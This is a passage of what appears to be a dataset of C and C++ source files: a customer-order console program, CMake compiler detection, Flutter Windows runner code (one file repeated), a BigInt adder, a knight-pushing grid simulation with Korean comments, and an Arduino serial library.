cout << \"Email: \" << customer.email << endl;\n          cout << \"Items: \" << endl;\n          for (const Item& item : customer_items) {\n            cout << item.description << \": $\" << item.price << endl;\n          }\n          cout << \"Total Number of Items: \" << customer_items.size() << endl;\n          cout << \"Total: $\" << total << endl;\n          return;\n        }\n        for (int i = 0; i < items.size(); i++) {\n          if (items[i].id == item_number) {\n            total += items[i].price;\n            cout << \"Added \" << items[i].description << \": $\" << items[i].price << endl << endl;\n            customer_items.push_back(items[i]);\n            //collect garbage\n            cin.clear();\n            cout << \"Enter item number (0 to quit)\" << endl;\n            break;\n          }\n          if (i == items.size() - 1) {\n            cout << \"Item not found\" << endl << endl;\n            cout << \"Enter item number (0 to quit)\" << endl;\n          }\n        }\n            \n          \n        \n      }\n  }\n}\n  cout << \"Customer not found\" << endl;\n}\n\n\n\nint main() {\n  read_customers(\"customers.txt\");\n  read_items(\"items.txt\");\n  one_customer_order();\n}",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutterproj_new\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <limits>\n#include <vector>\n#include <stack>\n#include <cstdint>\n\nusing llu = uint64_t;\nusing namespace std;\n\nclass BigInt{\n    static const llu LOW_BITS_MASK = static_cast<llu>(numeric_limits<uint32_t>::max());\n    static const llu HIGH_BITS_MASK = static_cast<llu>(numeric_limits<uint32_t>::max()) << 32;\nprivate:\n    vector<llu> mDigits{};// little endian\n    void plus(uint32_t x){\n        llu carry = 0;\n        for(llu& digit : mDigits){\n            digit *= x;\n            llu carry1 = digit >> 32;\n            digit &= LOW_BITS_MASK;\n            digit += carry;\n            llu carry2 = digit >> 32;\n            digit &= LOW_BITS_MASK;\n            carry = carry1 + carry2;\n        }\n        while (carry != 0){\n            mDigits.emplace_back(carry & LOW_BITS_MASK);\n            carry >>= 32;\n        }\n    }\n    void add(uint32_t x) {\n        llu carry = x;\n        for (llu &digit: mDigits) {\n            digit += carry;\n            carry = digit >> 32;\n            digit &= LOW_BITS_MASK;\n            if(carry == 0) break;\n        }\n        if(carry > 0){\n            mDigits.emplace_back(x);\n        }\n    }\n    uint32_t div(uint32_t x){\n        llu res = 0;\n        for(int i=int(mDigits.size())-1; i>=0; i--){\n            auto& digit = mDigits[i];\n            digit += res << 32;\n            res = (digit % x);\n            digit /= x;\n        }\n        return res;\n    }\n    void pad(size_t count){\n        mDigits.reserve(count);\n        while (mDigits.size() < count){\n            mDigits.emplace_back(0);\n        }\n    }\n    void squeeze(){\n        while(!mDigits.empty() && mDigits.back() == 0){\n            mDigits.pop_back();\n        }\n    }\npublic:\n    BigInt() = default;\n    explicit BigInt(uint32_t x): mDigits({x}){}\n    explicit BigInt(const string& x){\n        for(char digit: x){\n            if(isdigit(digit)) {\n                plus(10);\n                add(uint32_t(digit - '0'));\n            }\n        }\n    }\n    BigInt operator+(const BigInt& x) const {\n        BigInt result;\n        result.pad(std::max(mDigits.size(), x.mDigits.size()));\n        int i=0, j=0;\n        for(;i<mDigits.size() && j<x.mDigits.size(); i++, j++){\n            result.mDigits[i] = mDigits[i]+x.mDigits[j];\n        }\n        while (i<mDigits.size()){\n            result.mDigits[i] = mDigits[i];\n            i++;\n        }\n        while (j<x.mDigits.size()){\n            result.mDigits[j] = x.mDigits[j];\n            j++;\n        }\n        result.add(0);\n        return result;\n    }\n    bool operator==(uint32_t x) const{\n        if(x==0 && mDigits.empty()) return true;\n        if(mDigits[0] != x) return false;\n        for(int i=1; i<mDigits.size(); i++){\n            if(mDigits[i] != 0) return false;\n        }\n        return true;\n    }\n    bool operator!=(uint32_t x) const{\n        return !operator==(x);\n    }\n    friend ostream& operator<<(ostream& os, BigInt x){\n        if(x == 0){\n            return os << '0';\n        }\n        stack<int> stk;\n        while(x != 0){\n            stk.emplace(x.div(10));\n        }\n        while(!stk.empty()){\n            os << stk.top();\n            stk.pop();\n        }\n        return os;\n    }\n};\n\nint main() {\n    string aStr, bStr;\n    getline(cin, aStr);\n    getline(cin, bStr);\n    BigInt a(aStr), b(bStr);\n//    cout << a<< '\\n' << b << '\\n' << a+b << endl;\n    cout << a+b << endl;\n    return 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\n#include <vector>\n#include <queue>\n#include <cstring>\nusing namespace std;\n\nint L, N, Q, answer;\nint MAP[41][41];\nint knightMAP[41][41];\nint visited[41][41];\nint dy[4] = { -1, 0, 1, 0 };\nint dx[4] = { 0, 1, 0, -1 };\nint isDead[31];                 // 1\uc774\uba74 \uc8fd\uc740\uac70\uc784\nint damaged[31];                // \ubc1b\uc740 \ub370\ubbf8\uc9c0\n\nstruct Node {\n    int y;\n    int x;\n};\n\nstruct knightInfo {\n    int r;\n    int c;\n    int h;\n    int w;\n    int k;            // \uccb4\ub825\n};\n\nknightInfo knightList[31];\nvector <Node> query;        // \uc655\uc758 \uba85\ub839 \uc815\ubcf4 \ucffc\ub9ac \ub2f4\uc74c\nint pushList[31];           // \uac01 \ucffc\ub9ac\ub9c8\ub2e4 \uc6c0\uc9c1\uc77c \uc218 \uc788\ub294 \uae30\uc0ac \ub2f4\uae30\n\nvoid init() {\n    memset(MAP, 0, sizeof(MAP));\n    memset(knightMAP, 0, sizeof(knightMAP));\n    memset(knightList, 0, sizeof(knightList));\n    memset(isDead, 0, sizeof(isDead));\n    memset(damaged, 0, sizeof(damaged));\n    query.clear();\n}\n\nvoid input() {\n    cin >> L >> N >> Q;\n    for (int i = 0; i < L; i++) {\n        for (int j = 0; j < L; j++) {\n            cin >> MAP[i][j];\n        }\n    }\n\n    int tempR, tempC, tempH, tempW, tempK;\n    for (int i = 1; i <= N; i++) {\n        cin >> tempR >> tempC >> tempH >> tempW >> tempK;\n        knightList[i] = { tempR - 1, tempC - 1, tempH, tempW, tempK };\n\n        for (int j = knightList[i].r; j < knightList[i].r + knightList[i].h; j++) {        // \uae30\uc0ac\ub9f5\uc5d0 \ucd08\uae30\uc704\uce58 \uc801\uae30\n            for (int k = knightList[i].c; k < knightList[i].c + knightList[i].w; k++) {\n                knightMAP[j][k] = i;\n            }\n        }\n    }\n\n    int tempI, tempD;\n    for (int i = 0; i < Q; i++) {\n        cin >> tempI >> tempD;\n        query.push_back({ tempI, tempD });        // \uadf8\ub0e5 \ub178\ub4dc \uad6c\uc870\uccb4 \uc7ac\ud65c\uc6a9\ud574\uc11c \uc37c\ub2e4\n    }\n}\n\n// bfs\ub85c \ubbf8\ub294\ub370 \ud3ec\ud568\ub418\ub294 \uae30\uc0ac\ub4e4 \uccb4\ud06c\nbool check(int curNum, int dir) {\n\n    // \ud574\ub2f9 \uccb4\ud06c\uc5d0\uc11c \uc0ac\uc6a9\ud558\ub294\uac83\ub4e4 \ucd08\uae30\ud654\n    memset(pushList, 0, sizeof(pushList));\n    memset(visited, 0, sizeof(visited));\n    pushList[curNum] = 1;\n\n    // \ud050 \uc2dc\uc791\n    queue <Node> q;\n    q.push({ knightList[curNum].r, knightList[curNum].c });\n    visited[knightList[curNum].r][knightList[curNum].c] = 1;\n\n    while (!q.empty()) {\n        Node now = q.front();\n        q.pop();\n\n        for (int i = 0; i < 4; i++) {\n            int ny = now.y + dy[i];\n            int nx = now.x + dx[i];\n\n            if (i == dir) {\n                if (ny < 0 || nx < 0 || ny >= L || nx >= L)            // \ub9f5 \ubc14\uae65\uc774\uba74 \ud478\uc2dc \ubabb\ud574\n                    return false;\n                if (MAP[ny][nx] == 2)                                // \ub2e4\uc74c\uc774 \ubcbd\uc774\uba74 \ud478\uc2dc \ubabb\ud574\n                    return false;\n                if (visited[ny][nx] == 1 || knightMAP[ny][nx] == 0)    // \ubc29\ubb38\ud588\uac70\ub098 \uae30\uc0ac\uac00 \uc5c6\uc73c\uba74 \uc548 \ub2f4\uc544\n                    continue;\n            }\n\n            else {\n                if (ny < 0 || nx < 0 || ny >= L || nx >= L)\n                    continue;\n                if (visited[ny][nx] == 1 || knightMAP[ny][nx] == 0)    // \ubc29\ubb38\ud588\uac70\ub098 \uae30\uc0ac\uac00 \uc5c6\uc73c\uba74 \uc548 \ub2f4\uc544\n                    continue;\n                if (knightMAP[now.y][now.x] != knightMAP[ny][nx])    // \ub2e4\ub978 \uae30\uc0ac\uba74 \uc548 \ub2f4\uc544 \n                    continue;\n            }\n\n            pushList[knightMAP[ny][nx]] = 1;\n            q.push({ ny, nx });\n            visited[ny][nx] = 1;\n        }\n    }\n    return true;\n}\n\nvoid push(int curNum, int dir) {\n\n    if (check(curNum, dir) == 0)    // \ubabb \ubbf8\ub294 \uc0c1\ud669\uc774\uba74..\n        return;\n    \n    // \ubc00\uc5b4\uc9c0\ub294 \uae30\uc0ac\ub4e4 \uccb4\ud06c\n    for (int i = 1; i <= N ; i++){\n        if (pushList[i] == 0)\n            continue;\n\n        // \ubc00\uc5b4\uc9c0\ub294 \uae30\uc0ac\uc77c\ub54c, \uc77c\ub2e8 \ubc00\uae30 \uc704\ud574 \uae30\uc874\uc5d0 \ub098\uc774\ud2b8\ub9f5\uc5d0 \uc800\uc7a5\ub41c \uae30\uc0ac \uc0ad\uc81c\n        for (int j = knightList[i].r; j < knightList[i].r + knightList[i].h; j++) {       \n            for (int k = knightList[i].c; k < knightList[i].c + knightList[i].w; k++) {\n                knightMAP[j][k] = 0;\n            }\n        }\n    }\n\n    // \uc77c\ub2e8 \ud478\uc2dc\ud574\uc11c \uc774\ub3d9\ud588\ub2e4 \uac00\uc815\ud588\uc744\ub54c, \ud568\uc815 \uac1c\uc218 \ud30c\uc545\ud558\uace0, \uc0b4 \uc218 \uc788\uc73c\uba74 \uc0c9\uce60\ud558\uae30 \n    for (int i = 1; i <= N; i++) {\n        if (pushList[i] == 0)       \n            continue;\n\n        int curTrabCnt = 0;\n        knightList[i].r = knightList[i].r + dy[dir];\n        knightList[i].c = knightList[i].c + dx[dir];\n        for (int j = knightList[i].r; j < knightList[i].r + knightList[i].h; j++) {        \n            for (int k = knightList[i].c; k < knightList[i].c + knightList[i].w; k++) {\n                if (MAP[j][k] == 1)\n                    curTrabCnt++;\n            }\n        }\n        \n        // \ubbf8\ub294 \uae30\uc0ac \ub9d0\uace0, \ubc00\ub9ac\ub294 \uae30\uc0ac\uba74 \ub370\ubbf8\uc9c0 \uac10\uc18c -> \uccb4\ub825\ubcf4\ub2e4 \ub192\uc740 \ub370\ubbf8\uc9c0\ub97c \ubc1b\uc73c\uba74 \ubaa9\ub85d\uc5d0\uc11c \uc0ad\uc81c\ud55c\ub2e4\n        if (i != curNum){                   \n            damaged[i] += curTrabCnt;\n            knightList[i].k -= curTrabCnt;\n            if (knightList[i].k <= 0) {   \n                isDead[i] = 1;\n                pushList[i] = 0;\n            }\n        }\n        \n        // \uc0b4\uc544\uc788\ub294 \uae30\uc0ac\ub4e4 \uae30\uc0ac \ub9f5\uc5d0 \uc0c9\uce60\ud558\uae30\n        if (isDead[i] == 0) {                                           \n            for (int j = knightList[i].r; j < knightList[i].r + knightList[i].h; j++) {\n                for (int k = knightList[i].c; k < knightList[i].c + knightList[i].w; k++) {\n                    knightMAP[j][k] = i;\n                }\n            }\n        }\n    }\n}\n\nvoid solve() {\n\n    for (int i = 0; i < query.size(); i++) {\n        int curNum = query[i].y;\n        int dir =",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n----------------------------------------------------------------------------\n\nThis file is part of the Sanworks ArCOM repository\nCopyright (C) 2016 Sanworks LLC, Sound Beach, New York, USA\n\n----------------------------------------------------------------------------\n\nThis program is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, version 3.\n\nThis program is distributed  WITHOUT ANY WARRANTY and without even the \nimplied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  \nSee the GNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n*/\n#include <Arduino.h>\n#include \"ArCOM.h\"\n\nArCOM::ArCOM(Stream &s) {\n  ArCOMstream = &s;  // Sets the interface (Serial, Serial1, SerialUSB, etc.)\n}\nunsigned int ArCOM::available() {\n  return ArCOMstream->available();\n}\nvoid ArCOM::flush() {\n  ArCOMstream->flush();\n}\nvoid ArCOM::writeByte(byte byte2Write) {\n  ArCOMstream->write(byte2Write);\n}\nvoid ArCOM::writeUint8(byte byte2Write) {\n  ArCOMstream->write(byte2Write);\n}\nvoid ArCOM::writeChar(char char2Write) {\n  ArCOMstream->write(char2Write);\n}\nvoid ArCOM::writeUint16(uint16_t int2Write) {\n    typeBuffer.uint16 = int2Write;\n    ArCOMstream->write(typeBuffer.byteArray, 2);\n}\n\nvoid ArCOM::writeUint32(uint32_t int2Write) {\n    typeBuffer.uint32 = 